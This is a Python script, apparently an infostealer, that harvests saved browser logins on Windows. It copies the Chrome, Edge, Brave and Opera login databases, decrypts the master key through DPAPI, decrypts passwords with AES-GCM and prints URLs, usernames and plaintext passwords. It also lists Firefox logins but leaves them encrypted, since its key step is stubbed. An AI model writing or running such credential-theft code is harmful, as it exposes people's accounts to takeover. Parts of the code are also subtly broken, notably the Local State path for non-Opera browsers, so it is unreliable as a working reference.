import os
import json
import base64
import sqlite3
import shutil
import re
import glob
import ctypes
import ctypes.wintypes
import subprocess
from pathlib import Path
from datetime import datetime
from uuid import getnode as get_mac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
import win32crypt  # from pywin32

# -------- Windows DPAPI decrypt (for Chrome-based browsers) ---------
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(encrypted_bytes):
    p = ctypes.create_string_buffer(encrypted_bytes, len(encrypted_bytes))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)) == 0:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

# -------- Chrome-based browsers master key ---------
def get_chrome_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
        master_key = dpapi_decrypt(encrypted_key)
        return master_key
    except Exception:
        return None

# -------- AES-GCM decrypt for Chrome passwords ---------
def aes_gcm_decrypt(ciphertext, key):
    nonce = ciphertext[3:15]
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_pass = decryptor.update(ciphertext[15:-16]) + decryptor.finalize()
    return decrypted_pass

def decrypt_password(encrypted_password, master_key):
    try:
        if encrypted_password[:3] == b'v10':
            return aes_gcm_decrypt(encrypted_password, master_key).decode('utf-8', errors='ignore')
        else:
            # Older versions, use DPAPI directly
            return dpapi_decrypt(encrypted_password).decode('utf-8', errors='ignore')
    except Exception:
        return ""

# -------- Get profiles for Chrome-based browsers ---------
def get_chrome_profiles(browser_name):
    base_paths = {
        'chrome': os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
        'edge': os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data"),
        'brave': os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data"),
        'opera': os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable"),
    }
    base_path = base_paths.get(browser_name.lower())
    if not base_path or not os.path.exists(base_path):
        return []

    profiles = []
    try:
        for entry in os.listdir(base_path):
            full_path = os.path.join(base_path, entry)
            if os.path.isdir(full_path) and (entry == "Default" or entry.startswith("Profile")):
                profiles.append(full_path)
    except Exception:
        pass
    return profiles

# -------- Extract Chrome-based passwords for all profiles ---------
def extract_chrome_passwords(browser_name):
    profiles = get_chrome_profiles(browser_name)
    if not profiles:
        return []

    master_key = None
    # Try to get master key from Local State in main folder
    local_state_path = None
    if browser_name.lower() == 'opera':
        local_state_path = os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable\Local State")
    else:
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], f"{browser_name}\User Data\Local State")

    if local_state_path and os.path.exists(local_state_path):
        master_key = get_chrome_master_key(local_state_path)
    if not master_key:
        return []

    passwords = []
    for profile_path in profiles:
        login_db_path = os.path.join(profile_path, "Login Data")
        if not os.path.exists(login_db_path):
            continue

        temp_db_path = os.path.join(os.environ['TEMP'], f"{browser_name}_{os.path.basename(profile_path)}_LoginDataTemp.db")
        try:
            shutil.copy2(login_db_path, temp_db_path)
        except Exception:
            continue

        try:
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if username or decrypted_password:
                    passwords.append(f"[{browser_name}] Profile: {os.path.basename(profile_path)}\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}")
            cursor.close()
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_db_path):
                os.remove(temp_db_path)

    return passwords

# -------- Firefox password decryption utilities ---------
def get_firefox_profiles():
    profiles_ini = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'profiles.ini')
    profiles = []
    if not os.path.exists(profiles_ini):
        return profiles
    try:
        with open(profiles_ini, 'r') as f:
            lines = f.readlines()
        current_profile = {}
        for line in lines:
            line = line.strip()
            if line.startswith('['):
                if current_profile:
                    profiles.append(current_profile)
                    current_profile = {}
            elif '=' in line:
                key, value = line.split('=', 1)
                current_profile[key.strip()] = value.strip()
        if current_profile:
            profiles.append(current_profile)
    except Exception:
        return profiles

    paths = []
    for profile in profiles:
        if profile.get('Path') and profile.get('IsRelative') == '1':
            path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', profile['Path'])
        elif profile.get('Path'):
            path = profile['Path']
        else:
            continue
        if os.path.exists(path):
            paths.append(path)
    return paths

# -------- Firefox key and login decryption ---------
# Firefox encrypts passwords using NSS key stored in key4.db
# Implementing full decryption here is complex — so this is a simplified version.

def decrypt_firefox_password(ciphertext, key):
    # ciphertext is base64 encrypted with some header bytes.
    # Use pycryptodome AES GCM decrypt with key to decrypt.
    try:
        decoded = base64.b64decode(ciphertext)
        iv = decoded[1:13]
        ciphertext = decoded[13:-16]
        tag = decoded[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode()
    except Exception:
        return ""

def get_firefox_master_key(profile_path):
    # This is very complicated — normally you would use NSS libraries or python-nss to get key
    # Here we skip this step and return None — so passwords won't be decrypted.
    return None

def extract_firefox_passwords():
    profiles = get_firefox_profiles()
    if not profiles:
        return []

    passwords = []
    for profile_path in profiles:
        logins_json = os.path.join(profile_path, "logins.json")
        if not os.path.exists(logins_json):
            continue

        try:
            with open(logins_json, "r", encoding='utf-8') as f:
                logins_data = json.load(f)
            for login in logins_data.get('logins', []):
                hostname = login.get('hostname')
                username = login.get('username')
                encrypted_password = login.get('encryptedPassword')
                # Firefox uses encryptedPassword or passwordCiphertext in new versions
                # We will just show encryptedPassword since full decryption is non-trivial here
                passwords.append(f"[Firefox] Profile: {os.path.basename(profile_path)}\nURL: {hostname}\nUsername: {username}\nEncrypted Password: {encrypted_password}\n{'-'*40}")
        except Exception:
            continue

    return passwords

# -------- Main entry to extract all browsers ---------
def extract_all_passwords():
    passwords = []
    browsers = ['chrome', 'edge', 'brave', 'opera']

    for browser in browsers:
        print(f"Extracting passwords from {browser}...")
        passwords.extend(extract_chrome_passwords(browser))

    print("Extracting passwords from Firefox...")
    passwords.extend(extract_firefox_passwords())

    if not passwords:
        passwords = ["No passwords found."]

    return passwords

# -------- Run and print all passwords ---------
if __name__ == "__main__":
    all_passwords = extract_all_passwords()
    for entry in all_passwords:
        print(entry)
